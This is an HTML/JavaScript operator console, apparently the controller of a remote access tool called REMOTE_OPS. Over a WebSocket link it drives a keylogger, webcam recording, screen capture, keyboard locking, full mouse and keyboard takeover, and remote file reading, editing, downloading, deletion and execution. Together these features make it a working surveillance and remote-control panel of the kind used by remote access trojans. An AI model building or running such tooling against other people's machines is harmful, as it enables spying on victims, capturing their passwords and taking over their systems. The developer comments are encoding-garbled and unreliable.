<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>REMOTE_OPS // V12_SMART_EXPLORER</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        /* --- CORE CSS --- */
        :root { --bg-color: #050505; --panel-bg: rgba(10, 20, 10, 0.95); --main-color: #00ff41; --accent-color: #00f7ff; --alert-color: #ff3333; --border: 1px solid #333; }
        * { box-sizing: border-box; }
        body { font-family: 'Share Tech Mono', monospace; background-color: var(--bg-color); color: var(--main-color); margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        .header { padding: 10px 20px; border-bottom: 2px solid var(--main-color); background: #001100; display: flex; justify-content: space-between; align-items: center; }
        .brand { font-size: 20px; font-weight: bold; } input, button, textarea { font-family: 'Share Tech Mono'; padding: 6px 10px; background: #000; color: var(--main-color); border: 1px solid var(--main-color); outline: none; }
        button:hover { background: var(--main-color); color: #000; cursor: pointer; }
        .btn-red { border-color: var(--alert-color); color: var(--alert-color); }
        .btn-red:hover { background: var(--alert-color); color: #fff; }

        .main-grid { display: grid; grid-template-columns: 280px 1fr; height: calc(100vh - 50px); }
        .panel { background: var(--panel-bg); border: var(--border); padding: 10px; display: flex; flex-direction: column; overflow: hidden; }

        /* TABS */
        .tab-bar { display: flex; gap: 5px; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 5px; }
        .tab-btn { flex: 1; border: none; background: #111; color: #555; font-size: 11px; }
        .tab-btn.active { background: var(--main-color); color: #000; }

        /* EXPLORER */
        .address-bar { display: flex; background: #111; border-bottom: 1px solid #333; padding: 8px; gap: 5px; align-items: center; }
        .crumb { cursor: pointer; color: #aaa; } .crumb:hover { color: #fff; text-decoration: underline; }
        
        .file-grid { flex-grow: 1; overflow-y: auto; padding: 10px; display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; align-content: start; }
        .file-item { display: flex; flex-direction: column; align-items: center; text-align: center; padding: 10px; border: 1px solid transparent; border-radius: 5px; cursor: pointer; }
        .file-item:hover { background: #112211; border-color: #004400; }
        .file-icon { font-size: 32px; margin-bottom: 5px; }
        .file-name { font-size: 11px; word-break: break-all; color: #ccc; }

        /* CONTEXT MENU */
        #context-menu { position: absolute; display: none; background: #111; border: 1px solid var(--main-color); z-index: 100; min-width: 140px; }
        .ctx-item { padding: 8px 12px; cursor: pointer; font-size: 12px; border-bottom: 1px solid #222; }
        .ctx-item:hover { background: var(--main-color); color: #000; }

        /* EDITOR MODAL */
        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 200; display: none; align-items: center; justify-content: center; }
        .modal-content { width: 85%; height: 85%; background: #000; border: 1px solid var(--main-color); display: flex; flex-direction: column; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
        .modal-header { padding: 10px; background: #111; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
        #editor-text { flex-grow: 1; background: #0c0c0c; color: #e0e0e0; border: none; padding: 15px; font-family: 'Fira Code', monospace; resize: none; outline: none; font-size: 13px; line-height: 1.5; }

        /* LIST & PREVIEW */
        .file-list { flex-grow: 1; overflow-y: auto; border: 1px solid #333; }
        .file-item-list { padding: 8px; border-bottom: 1px solid #222; cursor: pointer; display: flex; justify-content: space-between; font-size: 11px; }
        .preview-area { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; border: 1px solid #333; position: relative; }
        .preview-area img, .preview-area video { max-width: 100%; max-height: 100%; object-fit: contain; }
        
        .hidden { display: none !important; }
        .key-box { width: 100%; height: 100px; background: #0a0a0a; border: 1px solid #333; color: #0f0; font-size: 12px; resize: none; margin-top: 5px; }
    </style>
</head>
<body>

    <div class="header">
        <div class="brand">REMOTE<span>OPS</span></div>
        <div>
            <input type="text" id="ip" value="ws://localhost:9010">
            <button onclick="connect()">CONNECT</button>
        </div>
    </div>

    <div class="main-grid">
        <div class="panel">
            <div class="tab-bar">
                <button class="tab-btn active" onclick="switchTab('control')">CONTROLS</button>
                <button class="tab-btn" onclick="switchTab('explorer')">EXPLORER</button>
                <button class="tab-btn" onclick="switchTab('gallery')">GALLERY</button>
            </div>

            <div id="tab-control" style="display:flex; flex-direction:column; height:100%; overflow-y: auto;">
                <button onclick="send('PROCESS','LIST')" style="margin-bottom:5px;">REFRESH PROCESS</button>
                <button onclick="send('APP','LIST')" style="margin-bottom:5px;">REFRESH APPS</button>
                <div style="border-top:1px dashed #333; margin:10px 0;"></div>
                <button onclick="takeScreenshot()">üì∑ CAPTURE SCREEN</button>
                <button onclick="startWebcam()" style="margin-top:5px;">‚è∫ REC WEBCAM</button>
                <button onclick="stopWebcam()" style="margin-top:5px;" class="btn-red">‚ñ† STOP & SAVE</button>
                <button id="btn-remote" onclick="toggleRemote()">üéÆ REMOTE CONTROL</button>
                <div style="border-top:1px dashed #333; margin:10px 0; padding-top:10px;">
                    <div style="font-size:12px; color:#aaa; margin-bottom:5px;">KEYLOGGER</div>
                    <div style="display:flex; gap:5px;">
                        <button onclick="send('KEYBOARD','START')" style="flex:1">‚ñ∂ REC</button>
                        <button onclick="send('KEYBOARD','STOP')" class="btn-red" style="flex:1">‚ñ† STOP</button>
                    </div>
                    <textarea id="key-stream" class="key-box" readonly placeholder="> Keystrokes..."></textarea>
                    
                    <div style="font-size:12px; color:#aaa; margin-top:10px; margin-bottom: 5px;">SECURITY</div>
                    <div style="display:flex; gap:5px;">
                        <button class="btn-red" onclick="send('KEYBOARD','LOCK')" style="flex:1">üîí LOCK</button>
                        <button onclick="send('KEYBOARD','UNLOCK')" style="flex:1">üîì UNLOCK</button>
                    </div>
                </div>
            </div>

            <div id="tab-explorer" class="hidden" style="display:flex; flex-direction:column; height:100%;">
                <div style="padding:10px; color:#aaa; font-size:11px; text-align:center;">
                    Files are shown in the main panel ->
                </div>
                <button onclick="send('FILE','LIST_DIR',{path:''})">üíª MY COMPUTER</button>
                <button onclick="refresh()" style="margin-top:5px;">‚Üª REFRESH DIR</button>
            </div>

            <div id="tab-gallery" class="hidden" style="display:flex; flex-direction:column; height:100%;">
                <button onclick="send('FILE','LIST')" style="margin-bottom: 5px;">‚Üª RELOAD LIST</button>
                <div class="file-list" id="file-list-box">
                    <div style="padding:10px; color:#666; text-align:center;">Empty</div>
                </div>
            </div>
        </div>

        <div class="panel">
            <div id="explorer-view" class="hidden" style="height:100%; display:flex; flex-direction:column;">
                <div class="address-bar" id="breadcrumbs"><span>Not Connected</span></div>
                <div class="file-grid" id="file-grid"></div>
            </div>

            <div id="media-view" class="preview-area">
                <div style="position:absolute; top:5px; left:5px; background:rgba(0,0,0,0.7); padding:2px 5px; color:#aaa; font-size:11px;" id="view-label">WAITING...</div>
                <img id="main-view" alt="">
                <video id="video-player" controls class="hidden"></video>
            </div>

            <div id="log-area" style="height:60px; background:#000; border-top:1px solid #333; font-size:11px; color:#0f0; overflow-y:auto;"></div>
        </div>
    </div>

    <div id="context-menu">
        <div class="ctx-item" onclick="ctxSmartOpen()">üöÄ Open / Edit</div>
        <div class="ctx-item" onclick="ctxDownload()">‚¨á Download</div>
        <div class="ctx-item" onclick="ctxDelete()" style="color:var(--alert-color)">‚ùå Delete</div>
    </div>

    <div id="editor-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <span id="editor-title" style="color:#00ff41; font-weight:bold;">Editing...</span>
                <div>
                    <button onclick="saveFile()" style="border-color:#00ff41; color:#00ff41;">üíæ SAVE & CLOSE</button>
                    <button class="btn-red" onclick="closeEditor()">CANCEL</button>
                </div>
            </div>
            <textarea id="editor-text"></textarea>
        </div>
    </div>

    <canvas id="record-canvas" style="display:none;"></canvas>

<script>
    let ws = null;
    let currentPath = "";
    let selectedFile = null;
    let mediaRecorder = null, recordedChunks = [], isRecording = false;
    const canvas = document.getElementById('record-canvas');
    const ctx = canvas.getContext('2d');

    // --- UTILS: DETECT FILE TYPE ---
    function isTextFile(filename) {
        const exts = ['.txt', '.cpp', '.h', '.hpp', '.c', '.js', '.html', '.css', '.json', '.xml', '.log', '.ini', '.bat', '.cmd', '.py'];
        return exts.some(ext => filename.toLowerCase().endsWith(ext));
    }

    // --- CONNECTION ---
    function connect() {
        ws = new WebSocket(document.getElementById('ip').value);
        ws.binaryType = "arraybuffer";
        ws.onopen = () => { log("Connected"); send('FILE','LIST_DIR',{path:''}); };
        ws.onmessage = handleMessage;
    }
    function send(mod, cmd, payload={}) { if(ws) ws.send(JSON.stringify({module:mod, command:cmd, payload:payload})); }

    // --- MESSAGE HANDLER ---
    function handleMessage(evt) {
        if (evt.data instanceof ArrayBuffer) {
            // Binary Handling (Image/Video/Download)
            const blob = new Blob([evt.data]);
            // N·∫øu ƒëang trong modal editor ho·∫∑c context menu download -> T·∫£i v·ªÅ
            if (selectedFile && selectedFile.downloading) {
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a'); a.href = url; a.download = selectedFile.name; a.click();
                selectedFile.downloading = false;
                log("File downloaded: " + selectedFile.name);
            } else {
                // M·∫∑c ƒë·ªãnh l√† Stream ·∫£nh/video
                const url = URL.createObjectURL(blob);
                const imgView = document.getElementById('main-view');
                imgView.src = url;
                if(isRecording) {
                    const img = new Image(); img.onload = () => {
                        if (canvas.width !== img.width) { canvas.width = img.width; canvas.height = img.height; }
                        ctx.drawImage(img, 0, 0);
                    }; img.src = url;
                }
            }
        } else {
            try { handleJson(JSON.parse(evt.data)); } catch(e){}
        }
    }

    function handleJson(res) {
        if (res.command === 'LIST_DIR') renderExplorer(res);
        else if (res.command === 'READ_TEXT') openEditor(res);
        else if (res.command === 'WRITE_TEXT') {
            // [QUAN TR·ªåNG] L∆ØU XONG T·ª∞ ƒê√ìNG
            if (res.status === 'success') {
                alert("File Saved Successfully!");
                closeEditor(); // ƒê√≥ng modal
                refresh();     // Refresh l·∫°i list file
            } else {
                alert("Error saving file: " + res.message);
            }
        }
        else if (res.command === 'EXECUTE') {
            alert(res.status === 'success' ? "Executed on Server!" : "Execution Failed: " + res.message);
        }
        else if (res.command === 'DELETE' && res.status === 'success') refresh();
        else if (res.command === 'SAVE_VIDEO') { log("Video Saved!"); send('FILE','LIST'); switchTab('gallery'); }
        else if (res.module === 'KEYBOARD') {
            document.getElementById('key-stream').value += res.data.key;
        }
        else if (res.module === 'FILE' && res.command === 'LIST') renderGallery(res.data);
    }

    // --- EXPLORER LOGIC ---
    function renderExplorer(res) {
        currentPath = res.current_path;
        renderBreadcrumbs(currentPath);
        const grid = document.getElementById('file-grid');
        grid.innerHTML = "";
        
        // Sort: Drive -> Dir -> File
        const list = res.data.sort((a,b) => (a.type==='drive'?0:a.type==='dir'?1:2) - (b.type==='drive'?0:b.type==='dir'?1:2));

        list.forEach(f => {
            const el = document.createElement('div');
            el.className = 'file-item';
            let icon = f.type==='drive'?'üíΩ': f.type==='dir'?'üìÅ': f.type==='image'?'üñºÔ∏è': 'üìÑ';
            el.innerHTML = `<div class="file-icon">${icon}</div><div class="file-name">${f.name}</div>`;
            
            // CLICK LOGIC
            el.onclick = () => {
                if(f.type === 'dir' || f.type === 'drive') send('FILE','LIST_DIR',{path: f.path});
                else {
                    selectedFile = f;
                    ctxSmartOpen(); // G·ªçi h√†m m·ªü th√¥ng minh
                }
            };
            // CONTEXT MENU
            el.oncontextmenu = (e) => {
                e.preventDefault();
                selectedFile = f;
                showContextMenu(e.clientX, e.clientY, f.type);
            };
            grid.appendChild(el);
        });
    }

    function ctxSmartOpen() {
        if (!selectedFile) return;
        document.getElementById('context-menu').style.display = 'none';

        // [QUAN TR·ªåNG] KI·ªÇM TRA ƒêU√îI FILE
        if (isTextFile(selectedFile.name)) {
            // N·∫øu l√† file code -> G·ª≠i l·ªánh ƒê·ªåC ƒë·ªÉ s·ª≠a
            log("Opening editor for: " + selectedFile.name);
            send('FILE', 'READ_TEXT', {path: selectedFile.path});
        } else {
            // N·∫øu l√† exe, ·∫£nh, nh·∫°c -> G·ª≠i l·ªánh CH·∫†Y
            if(confirm("Execute/Run " + selectedFile.name + " on Server?")) {
                send('FILE', 'EXECUTE', {path: selectedFile.path});
            }
        }
    }

    function openEditor(res) {
        document.getElementById('editor-modal').style.display = 'flex';
        document.getElementById('editor-text').value = res.content;
        document.getElementById('editor-title').innerText = "EDIT: " + res.path;
        // L∆∞u path v√†o selectedFile ƒë·ªÉ d√πng khi save
        selectedFile = { path: res.path, name: res.path.split(/[\\/]/).pop() }; 
    }

    function saveFile() {
        const content = document.getElementById('editor-text').value;
        send('FILE', 'WRITE_TEXT', { path: selectedFile.path, content: content });
    }

    function closeEditor() { document.getElementById('editor-modal').style.display = 'none'; }

    // --- OTHER UI FUNCTIONS ---
    function renderBreadcrumbs(path) {
        const bar = document.getElementById('breadcrumbs');
        if(!path) { bar.innerHTML = "<span class='crumb' onclick=\"send('FILE','LIST_DIR',{path:''})\">MY COMPUTER</span>"; return; }
        const parts = path.split(/[\\/]/).filter(p => p.length > 0);
        bar.innerHTML = "<span class='crumb' onclick=\"send('FILE','LIST_DIR',{path:''})\">PC</span> > ";
        let built = "";
        parts.forEach((p,i) => {
            built += (i===0 && p.includes(':') ? p+"\\" : (i===0?p:"\\"+p));
            bar.innerHTML += `<span class='crumb' onclick="send('FILE','LIST_DIR',{path:'${built.replace(/\\/g,'\\\\')}'})">${p}</span>` + (i<parts.length-1?" > ":"");
        });
    }

    function showContextMenu(x, y) {
        const menu = document.getElementById('context-menu');
        menu.style.display = 'block'; menu.style.left = x+'px'; menu.style.top = y+'px';
    }
    document.addEventListener('click', () => document.getElementById('context-menu').style.display = 'none');

    function ctxDownload() {
        if(!selectedFile) return;
        selectedFile.downloading = true; // ƒê√°nh d·∫•u ƒë·ªÉ handleMessage bi·∫øt
        send('FILE', 'GET', {name: selectedFile.path});
    }
    function ctxDelete() {
        if(selectedFile && confirm("Delete "+selectedFile.name+"?")) send('FILE','DELETE',{path:selectedFile.path});
    }

    function switchTab(tab) {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelector(`button[onclick="switchTab('${tab}')"]`).classList.add('active');
        
        const views = {
            'control': ['tab-control', 'media-view'],
            'explorer': ['tab-explorer', 'explorer-view'],
            'gallery': ['tab-gallery', 'media-view']
        };

        // Hide all
        ['tab-control','tab-explorer','tab-gallery'].forEach(id => document.getElementById(id).classList.add('hidden'));
        ['media-view','explorer-view'].forEach(id => document.getElementById(id).classList.add('hidden'));

        // Show selected
        document.getElementById(views[tab][0]).classList.remove('hidden');
        document.getElementById(views[tab][1]).classList.remove('hidden');

        if(tab==='explorer') send('FILE','LIST_DIR',{path: currentPath});
        if(tab==='gallery') send('FILE','LIST');
        
        // Reset player if moving away from gallery
        if(tab!=='gallery') { 
            const vp=document.getElementById('video-player'); vp.pause(); vp.classList.add('hidden'); 
            document.getElementById('main-view').classList.remove('hidden');
        }
    }

    // --- MEDIA & REC FUNCTIONS ---
    function renderGallery(data) {
        const list = document.getElementById('file-list-box'); list.innerHTML = "";
        data.reverse().forEach(f => {
            const div = document.createElement('div'); div.className = 'file-item-list';
            div.innerHTML = `<span>${f.name}</span> <span style="color:#666">${(f.size/1024).toFixed(1)} KB</span>`;
            div.onclick = () => {
                document.getElementById('main-view').classList.add('hidden');
                document.getElementById('video-player').classList.add('hidden');
                if(f.name.endsWith('.webm')) {
                    const vp = document.getElementById('video-player'); vp.classList.remove('hidden');
                    ws.onmessage = (e) => { vp.src = URL.createObjectURL(new Blob([e.data],{type:'video/webm'})); vp.play(); ws.onmessage = handleMessage; };
                } else {
                    document.getElementById('main-view').classList.remove('hidden');
                    ws.onmessage = (e) => { document.getElementById('main-view').src = URL.createObjectURL(new Blob([e.data],{type:'image/jpeg'})); ws.onmessage = handleMessage; };
                }
                send('FILE','GET',{name:f.name});
            };
            list.appendChild(div);
        });
    }

    function startWebcam() { send('WEBCAM','START_STREAM'); isRecording=true; recordedChunks=[]; mediaRecorder = new MediaRecorder(canvas.captureStream(25)); mediaRecorder.ondataavailable=e=>{if(e.data.size>0)recordedChunks.push(e.data)}; mediaRecorder.onstop=uploadVideo; mediaRecorder.start(); document.getElementById('view-label').innerText="REC..."; }
    function stopWebcam() { send('WEBCAM','STOP_STREAM'); if(isRecording) { mediaRecorder.stop(); isRecording=false; } }
    function uploadVideo() { const r=new FileReader(); r.readAsDataURL(new Blob(recordedChunks,{type:'video/webm'})); r.onloadend=()=>{ send('FILE','SAVE_VIDEO',{name:`rec_${new Date().getTime()}.webm`, data:r.result.split(',')[1]}); }; }
    function takeScreenshot() { send('SCREEN','CAPTURE_BINARY'); }
    function refresh() { send('FILE','LIST_DIR',{path: currentPath}); }
    function log(m) { document.getElementById('log-area').innerText += `> ${m}\n`; }
    let isRemoteControl = false;
let lastMove = 0;

// --- H√ÄM B·∫¨T/T·∫ÆT ƒêI·ªÄU KHI·ªÇN ---
function toggleRemote() {
    isRemoteControl = !isRemoteControl;
    const btn = document.getElementById('btn-remote'); // B·∫°n c·∫ßn th√™m n√∫t n√†y v√†o HTML
    const img = document.getElementById('main-view');
    
    if (isRemoteControl) {
        btn.style.color = "#00ff41"; 
        btn.innerText = "üéÆ CONTROL: ON";
        img.style.cursor = "crosshair"; // ƒê·ªïi con tr·ªè chu·ªôt
        
        // G·∫Øn s·ª± ki·ªán
        setupInputListeners(img);
        
        // T·ª± ƒë·ªông ch·ª•p m√†n h√¨nh li√™n t·ª•c ƒë·ªÉ th·∫•y ph·∫£n h·ªìi (FPS th·∫•p th√¥i ƒë·ªÉ ƒë·ª° lag)
        window.remoteInterval = setInterval(takeScreenshot, 200); 
    } else {
        btn.style.color = ""; 
        btn.innerText = "üéÆ CONTROL: OFF";
        img.style.cursor = "default";
        
        // G·ª° s·ª± ki·ªán
        removeInputListeners(img);
        clearInterval(window.remoteInterval);
    }
}

// --- G·∫ÆN S·ª∞ KI·ªÜN ---
function setupInputListeners(element) {
    // Chu·ªôt
    element.addEventListener('mousemove', onRemoteMouseMove);
    element.addEventListener('mousedown', onRemoteMouseDown);
    element.addEventListener('mouseup', onRemoteMouseUp);
    element.addEventListener('contextmenu', (e) => e.preventDefault()); // Cho ph√©p chu·ªôt ph·∫£i
    element.addEventListener('wheel', onRemoteWheel, {passive: false}); // LƒÉn chu·ªôt

    // Ph√≠m (G·∫Øn v√†o window ƒë·ªÉ b·∫Øt to√†n c·ª•c)
    window.addEventListener('keydown', onRemoteKeyDown);
    window.addEventListener('keyup', onRemoteKeyUp);
}

function removeInputListeners(element) {
    element.removeEventListener('mousemove', onRemoteMouseMove);
    element.removeEventListener('mousedown', onRemoteMouseDown);
    element.removeEventListener('mouseup', onRemoteMouseUp);
    element.removeEventListener('contextmenu', (e) => e.preventDefault());
    element.removeEventListener('wheel', onRemoteWheel);
    window.removeEventListener('keydown', onRemoteKeyDown);
    window.removeEventListener('keyup', onRemoteKeyUp);
}

// --- X·ª¨ L√ù CHU·ªòT ---
function sendMouse(cmd, e, type=null) {
    const rect = e.target.getBoundingClientRect();
    // T√≠nh to·∫° ƒë·ªô t·ªâ l·ªá (0.0 -> 1.0)
    const xRel = (e.clientX - rect.left) / rect.width;
    const yRel = (e.clientY - rect.top) / rect.height;
    
    let btn = 'left';
    if (e.button === 2) btn = 'right';
    if (e.button === 1) btn = 'middle';

    send('INPUT', cmd, { x: xRel, y: yRel, btn: btn, type: type });
}

function onRemoteMouseMove(e) {
    const now = Date.now();
    if (now - lastMove < 50) return; // Gi·ªõi h·∫°n g·ª≠i 20 l·∫ßn/gi√¢y ƒë·ªÉ kh√¥ng ngh·∫Ωn m·∫°ng
    lastMove = now;
    sendMouse('MOUSE_MOVE', e);
}

function onRemoteMouseDown(e) { sendMouse('MOUSE_BTN', e, 'down'); }
function onRemoteMouseUp(e) { sendMouse('MOUSE_BTN', e, 'up'); }

function onRemoteWheel(e) {
    e.preventDefault();
    // Server c·∫ßn s·ªë √¢m ƒë·ªÉ cu·ªôn xu·ªëng, d∆∞∆°ng ƒë·ªÉ l√™n (ng∆∞·ª£c v·ªõi JS m·ªôt ch√∫t t√πy tr√¨nh duy·ªát)
    let delta = (e.deltaY > 0) ? -120 : 120; 
    send('INPUT', 'MOUSE_WHEEL', { delta: delta });
}

// --- X·ª¨ L√ù PH√çM ---
function onRemoteKeyDown(e) {
    if (!isRemoteControl) return;
    e.preventDefault(); // Ch·∫∑n ph√≠m t·∫Øt tr√¨nh duy·ªát (F5, Ctrl+S...)
    send('INPUT', 'KEY_EVENT', { key: e.keyCode, type: 'down' });
}

function onRemoteKeyUp(e) {
    if (!isRemoteControl) return;
    e.preventDefault();
    send('INPUT', 'KEY_EVENT', { key: e.keyCode, type: 'up' });
}
</script>
</body>
</html>